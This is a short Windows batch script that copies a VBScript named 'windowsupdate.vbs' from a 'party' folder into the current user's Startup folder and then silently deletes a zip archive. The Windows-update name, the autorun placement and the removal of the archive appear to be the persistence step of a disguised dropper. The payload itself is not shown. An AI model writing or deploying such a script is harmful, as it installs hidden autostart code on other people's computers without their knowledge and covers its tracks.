@echo off
prompt
copy C:\Users\"%username%"\Documents\party\windowsupdate.vbs C:\Users\"%username%"\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\windowsupdate.vbs
@del C:\Users\"%username%"\Documents\party\zip.zip